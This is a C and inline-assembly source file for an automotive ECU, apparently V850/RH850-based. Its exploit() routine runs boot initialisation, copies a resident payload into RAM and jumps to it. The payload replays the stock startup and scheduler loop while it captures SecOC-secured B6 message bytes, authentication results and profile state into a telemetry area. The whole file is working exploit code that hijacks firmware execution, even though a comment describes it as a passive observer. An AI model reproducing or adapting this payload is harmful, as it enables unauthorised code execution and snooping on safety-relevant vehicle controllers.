/* Exact-F33 protected-B6 transaction observer: RAM-only, no SecOC bypass. */
typedef void (*fn0_t)(void);
typedef void (*fn1_t)(unsigned int);
#include "target_config.h"
#define STR_INNER(x) #x
#define STR(x) STR_INNER(x)
#define B6_SECURED_LENGTH 32u

/* 28 raw telemetry bytes at TARGET_RESIDENT_TELEMETRY_BASE:
 * 00..03 heartbeat u32 LE
 * 04     queued-B6 scheduler samples (u8, modulo 256)
 * 05     native D7 queue samples (u8, modulo 256; scheduler control)
 * 06..07 reserved
 * 08     current B6 profile state before stock aggregate processing
 * 09     current B6 profile state after stock aggregate processing
 * 0A..0B post queue record length (raw LE)
 * 0C     post SecOC result FEBE5564
 * 0D..0F reserved
 * 10..14 raw B6 B3..B7 at last queued-B6 sample
 * 15..17 reserved
 * 18..1B raw B6 B28..B31 at last queued-B6 sample
 */
#define T_HEARTBEAT 0u
#define T_QUEUE_SAMPLES 4u
#define T_D7_QUEUE_SAMPLES 5u
#define T_PRE_PROFILE_STATE 8u
#define T_POST_PROFILE_STATE 9u
#define T_POST_QUEUE 10u
#define T_POST_RESULT 12u
#define T_WIRE 16u
#define T_TRAILER 24u
#define TELEMETRY_SIZE 28u

static void copy_bytes(volatile unsigned char *dst, const volatile unsigned char *src,
                       unsigned int n) __attribute__((noinline));
static void call0(unsigned int address) __attribute__((noinline));
void resident_entry(void) __attribute__((noreturn, noinline));
void resident_tail_marker(void) __attribute__((noinline));

void __attribute__((noreturn)) exploit(void) {
  __asm__ volatile(
    "mov " STR(TARGET_BOOT_INIT_0) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_1) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_2) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_3) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_VALIDITY_CHECK) ", r12\n\tjarl [r12], lp\n\t"
    "cmp r0, r10\n\tbne 1f\n\t"
  );
  copy_bytes((volatile unsigned char *)TARGET_RESIDENT_BASE,
             (const volatile unsigned char *)(TARGET_STAGING_BASE +
                                              (unsigned int)&resident_entry),
             ((unsigned int)&resident_tail_marker - (unsigned int)&resident_entry) + 8u);
  __asm__ volatile(
    "mov " STR(TARGET_APP_CPU_CONTEXT_INIT) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_RESIDENT_BASE) ", r12\n\tjmp [r12]\n\t"
    "1: br 1b\n\t"
  );
  __builtin_unreachable();
}

void resident_entry(void) {
  for (unsigned int pc = TARGET_APP_STARTUP_FIRST_JARL;
       pc < TARGET_APP_STARTUP_AFTER_JARLS; pc += 4u) {
    unsigned int ins = *(volatile unsigned int *)pc;
    int signed_high6 = (int)(ins & 0x3fu);
    signed_high6 = (signed_high6 ^ 0x20) - 0x20;
    call0(pc + ((unsigned int)(signed_high6 << 16) | (ins >> 16)));
  }
  ((fn1_t)TARGET_APP_STARTUP_FINAL_INIT)(0u);
  __asm__ volatile("ei");

  unsigned char t[TELEMETRY_SIZE];
  *(unsigned int *)(t + T_HEARTBEAT) = 0x4f364236u; /* "6B6O" */
  t[T_QUEUE_SAMPLES] = 0u;
  t[T_D7_QUEUE_SAMPLES] = 0u;

  for (;;) {
    unsigned int timing = 0u;
    __asm__ volatile(
      "1: tst1 " STR(TARGET_TICK_BIT) ", " STR(TARGET_TICK_DISPLACEMENT) "[r0]\n\t"
      "be 1b\n\t"
      "clr1 " STR(TARGET_TICK_BIT) ", " STR(TARGET_TICK_DISPLACEMENT) "[r0]"
    );
    if (*(volatile unsigned char *)TARGET_FOREGROUND_TIMING_FLAG == 0x5au) {
      call0(TARGET_FG_TIMING_BEGIN);
      timing = 1u;
    }
    call0(TARGET_FG_PRE_0);
    call0(TARGET_FG_PRE_1);
    call0(TARGET_FG_PRE_2);
    call0(TARGET_FG_PRE_3);

    t[T_PRE_PROFILE_STATE] = *(volatile unsigned char *)TARGET_B6_PROFILE_STATE;
    if (*(volatile unsigned short *)TARGET_D7_QUEUE_RECORD == B6_SECURED_LENGTH) {
      t[T_D7_QUEUE_SAMPLES]++;
    }
    unsigned int queued_b6 =
        *(volatile unsigned short *)TARGET_B6_QUEUE_RECORD == B6_SECURED_LENGTH;
    if (queued_b6 != 0u) {
      t[T_QUEUE_SAMPLES]++;
      copy_bytes(t + T_WIRE, (const volatile unsigned char *)(TARGET_B6_SECURED_BUFFER + 3u), 5u);
      copy_bytes(t + T_TRAILER, (const volatile unsigned char *)(TARGET_B6_SECURED_BUFFER + 28u), 4u);
    }

    call0(TARGET_FG_AGGREGATE); /* unchanged stock communication/SecOC path */
    t[T_POST_PROFILE_STATE] = *(volatile unsigned char *)TARGET_B6_PROFILE_STATE;

    if (queued_b6 != 0u) {
      copy_bytes(t + T_POST_QUEUE, (const volatile unsigned char *)TARGET_B6_QUEUE_RECORD, 2u);
      t[T_POST_RESULT] = *(volatile unsigned char *)TARGET_B6_SECOC_RESULT;
    }

    call0(TARGET_FG_POST_0);
    call0(TARGET_FG_POST_1);
    call0(TARGET_FG_POST_2);
    if (timing != 0u) call0(TARGET_FG_TIMING_END);
    (*(volatile unsigned char *)TARGET_FOREGROUND_TICK_COUNTER)++;
    (*(unsigned int *)(t + T_HEARTBEAT))++;
    copy_bytes((volatile unsigned char *)TARGET_RESIDENT_TELEMETRY_BASE, t, TELEMETRY_SIZE);
  }
}

static void copy_bytes(volatile unsigned char *dst, const volatile unsigned char *src,
                       unsigned int n) { for (unsigned int i = 0u; i < n; i++) dst[i] = src[i]; }
static void call0(unsigned int address) { ((fn0_t)address)(); }
void resident_tail_marker(void) { return; }
